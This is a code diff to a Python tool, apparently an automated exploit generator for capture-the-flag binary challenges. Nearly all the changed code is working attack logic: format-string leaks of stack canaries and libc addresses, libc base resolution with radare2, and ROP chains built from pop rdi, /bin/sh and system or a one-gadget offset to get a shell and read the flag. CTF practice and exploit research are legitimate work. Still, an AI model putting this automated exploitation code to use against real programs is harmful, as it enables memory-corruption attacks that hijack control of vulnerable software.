@@ -71,7 +71,7 @@ class Raeg:
         p.sendline(b"%p")
         output = b""
         try:
-            p.recvuntil(b"<<<")
+            p.recvline(b"<<<")
             output = p.recvline()
             logging.getLogger("pwnlib").setLevel(logging.INFO)
         except EOFError:
@@ -420,24 +420,26 @@ class Raeg:
 
 
     def rop_libc(self):
-        #p = process(self.binary)
-        r = ROP(self.libc)
+        p = process(self.binary)
+        r = ROP(self.elf)
         gs = '''
             init-pwndbg
         '''
 
-        p = gdb.debug(self.binary,gdbscript=gs)
+        #p = gdb.debug(self.binary,gdbscript=gs)
 
         f = open("./format.txt", "w+")
         f.write(self.libc_offset_string + "\n")
         f.close()
 
+        self.resolve_libc_offset()
+
+        addr = self.elf.get_section_by_name(".data").header.sh_addr
 
         prompt = p.recvline()
         if b"Leak" in prompt:
             self.leak = int(prompt.split(b":")[1].strip(b"\n"),16)
             log.info(f"Libc address leaked {hex(self.leak)}")
-            self.resolve_libc_offset()
 
             self.libc.address = self.leak + self.libc_offset
 
@@ -446,8 +448,13 @@ class Raeg:
         else:
             if self.libc_offset_string != None:
                 p.sendline(bytes(self.libc_offset_string, "utf-8"))
+                p.recvuntil(b"0x")
+                self.leak = int(p.recvline().strip(b"\n"),16)
+                log.info(f"Libc address leaked {hex(self.leak)}")
+                self.libc.address = self.leak + self.libc_offset
 
-                self.resolve_libc_offset()
+                log.info(f"Found libc base address {hex(self.libc.address)}")
+
 
         pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0] + self.libc.address)
         bin_sh = p64(next(self.libc.search(b"/bin/sh\x00")))
@@ -455,21 +462,34 @@ class Raeg:
         log.info(f"Found /bin/sh address in libc {hex(u64(bin_sh))}")
 
         #chain = self.symbolic_padding
-        chain = b"A" * 200
-        #chain += p64(self.libc.address + 0x4f302)
-        #chain += p64(0) * 200
+        # printlibc-7
+        #chain = b"A" * 216
+        chain = b"A" * 168
+        # ret2one-4
+        #chain = b"A" * 136
 
-        chain += pop_rdi + bin_sh
-        chain += p64(self.elf.sym["_fini"])
-        chain += p64(self.libc.sym["system"])
+
+        chain += p64(self.libc.address + 0x4f302)
+        chain += p64(0) * 100
+
+        #chain += pop_rdi + bin_sh
+        #chain += p64(self.elf.sym["_fini"])
+        #chain += p64(self.libc.sym["system"])
 
         p.sendline(chain)
-        p.interactive()
+        p.sendline(b"cat flag.txt")
+        try:
+            output = p.recvuntil(b"}").decode().split("\n")[-1]
+            if self.flag == None:
+                self.flag = output
+        except:
+            log.info("ROP chain exploit failed")
+
 
     def generate_rop_chain(self):
 
         if self.string_address == None:
-            #Perform a write primitive
+            #Perform a w16te primitive
             print(self.has_libc_leak)
             if self.has_libc_leak == True:
                 self.rop_chain = self.rop_libc()
@@ -488,7 +508,7 @@ class Raeg:
 
         control = 0
         start_end = [0,0]
-        stack_len = 300
+        stack_len = 100
         string = ""
 
         # Run the process for stack_len amount of times to leak the entire stack
@@ -510,7 +530,6 @@ class Raeg:
                 if response[0].decode() != "(nil)":
                     address = response[0].decode()
                     response = response[0].strip(b"0x")
-
                     # Find a the valid canary on the stack
                     canary = re.search(r"0x[a-f0-9]{14}00", address)
                     if canary and self.elf.canary:
@@ -519,12 +538,12 @@ class Raeg:
                         log.info(f"Found canary leak at offset {i}:{address}")
                         logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
 
-                    libc_leak = re.search(r"0x7f[a-f0-9]+34a", address)
+                    libc_leak = re.search(r"0x7f[^f][a-f0-9]+4a", address)
                     if libc_leak:
                         self.libc_offset_string = offset_str.split(".")[0]
                         self.has_libc_leak = True
                         logging.getLogger("pwnlib").setLevel(logging.INFO)
-                        log.info(f"Found libc leak for libc_start_main at offset {i}:{address}")
+                        log.info(f"Found libc leak for libc_start_main at offset {i}:{hex(address)}")
                         logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
 
                     try:
@@ -543,11 +562,17 @@ class Raeg:
                             self.flag  = string
                             control = 1
                     except:
+                        logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
                         log.info("RIP")
+                logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
                 p.close()
             except:
+                logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
                 log.info("BOZO")
+
+            logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
             p.close()
+
 
         logging.getLogger("pwnlib").setLevel(logging.INFO)
 
@@ -560,7 +585,6 @@ class Raeg:
     # Function to resolve the libc base offset from the leak
     def resolve_libc_offset(self):
 
-        print(self.libc_offset_string)
         self.r2 = r2pipe.open(self.binary, flags=["-d", "rarun2", f"program={self.binary}", f"stdin=./format.txt"])
 
 
@@ -615,7 +639,6 @@ class Raeg:
         #print("Cleaning disgusting r2 shit off of screen")
         #os.system("clear")
         log.info(f"Found libc offset {self.libc_offset}")
-        print(self.libc_offset)
 
 
         return None
